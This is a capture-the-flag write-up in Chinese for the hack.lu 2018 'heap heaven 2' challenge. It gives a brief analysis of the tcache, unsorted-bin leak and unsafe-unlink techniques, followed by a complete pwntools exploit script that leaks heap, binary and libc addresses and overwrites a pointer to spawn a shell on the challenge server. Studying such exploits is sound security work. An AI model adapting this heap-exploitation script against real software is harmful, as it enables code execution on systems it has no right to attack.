# heap heaven 2

## 分析
好像是第一次做tcache的题，才知道有个tcache的机制

程序逻辑比较简单，mmap随机申请了一块内存，读写属性，然后对该内存进行操作。

* write，指定offset和写入大小
* alloc，未实现
* free，就是free
* leak，指定offset，puts打印

unsort_bin进行free，然后在mmap段即可有堆地址，然后可以实现任意地址泄露。
之后，通过`unsafe_unlink_attack`改mmap在bss段的值，然后任意地址写

> 需要注意：新版本libc，有tcache机制，0x400以下堆大小，均走tcache，0x400以上与老版本行为相似。

## 脚本

```python
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools

IP = "arcade.fluxfingers.net"
PORT = 1809
# IP = "192.168.33.1"
# PORT = 9999

context.arch = "amd64"
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./heap_heaven_2"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()



io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    context.noptrace = True
    io = remote(IP, PORT)  
    libc = ELF("./libc.so.6")
elif args.local or args.debugger:
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    # env = {}
    io = process(BIN, env=env)
    print io.libs()
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/hack.lu2018/pwn/heap_heaven/public/heap_heaven_2"]
    libc_bb = io.libs()[
        '/home/vagrant/DongFeng/hack.lu2018/pwn/heap_heaven/public/libc.so.6']
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF(
        "/home/vagrant/DongFeng/hack.lu2018/pwn/heap_heaven/public/libc.so.6")
else:
    parser.print_help()
    exit()

if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    '''.format(
        proc_base + 0x0000000000001496,  # call exit bye
        proc_base + 0x00000000000015FF,  # free
        libc_bb + 0x000000000008267A,  # int_free
        # proc_base + 0x0000000000001409  # options 2 
        # libc_bb + one_gg
        )
    )


def alloc_heap():
    rud("[5] : exit")
    sel(str(2))

def write_heap(offset, payload):
    rud("[5] : exit")
    sel("1")
    rud("How much do you want to write?")
    sel(str(len(payload)))
    rud("At which offset?")
    sel(str(offset))
    sel(payload)

def leak_heap(offset):
    rud("[5] : exit")
    sel("4")
    rud("At which offset do you want to leak?")
    sel(str(offset))

def free_heap(offset):
    rud("[5] : exit")
    sel("3")
    rud("At which offset do you want to free?")
    sel(str(offset))

def gen_heap(presize, size):
    return p64(presize) + p64(size) + "\x00" * (size-0x10-1) 


payload1 = gen_heap(0, 0x3a1) + gen_heap(0x3a0, 0x501) + \
    gen_heap(0x500, 0x201) + gen_heap(0x200, 0x201)
write_heap(0x1000, payload1)
# write_heap(0, payload1)
# alloc_heap()

free_heap(str(0x10+0x1000))
free_heap(str(0x10+0x1000+0x3a0))


leak_heap(str(0x1000+0x3a0+0x10))
# leak_heap(str(0x1000+0x10))

data = io.recvuntil("Please", timeout=3).strip().split("\n")[0]
mainarena88 = pick64(data)
heap_base = mainarena88
log.critical("heap address 0x%x" % heap_base)


def leak_address(address):
    write_heap(len(payload1)+0x1000, p64(address))
    leak_heap(len(payload1)+0x1000)
    data = io.recvuntil("Please", timeout=3).strip().split("\n")[0]
    leaked = pick64(data)
    log.critical(hex(leaked))
    return leaked

bin_bye = leak_address(heap_base - 0x10)
binary.address = bin_bye - 0x1670
log.critical("binary.address 0x%x" % binary.address)


strtoul_libc = leak_address(binary.address + 0x0000000000003FB8)
libc.address = strtoul_libc - libc.symbols["setvbuf"]
log.critical("libc.address 0x%x" % libc.address)

alloc_heap()
mmap_offset = 0x0000000000004049
mmap_addr = leak_address(binary.address + mmap_offset) << 8
log.critical("mmap_addr 0x%x" % mmap_addr)
mmap_offset = 0x0000000000004048


new_heap = p64(0)  + p64(0) + p64(binary.address + mmap_offset - 8*3) + p64(binary.address + mmap_offset - 8*2) + "\x00" * (0x90 - 0x10 - 0x10)
new_heap += p64(0x90) + p64(0x450) + "\x00"*0x440 + p64(0x450) + p64(0x91) + "\x00" * 0x80 + p64(0x90)  + p64(0x91)

log.critical("the new payload len: 0x%x" %len(new_heap))

write_heap(0, new_heap)

free_heap(0x90+0x10)

new_payload2 = heap_base - 0x10

write_heap(3*8, p64(new_payload2))

write_heap(0, p64(libc.address + 0xe75f0))

alloc_heap()

sel("5")

io.interactive()
```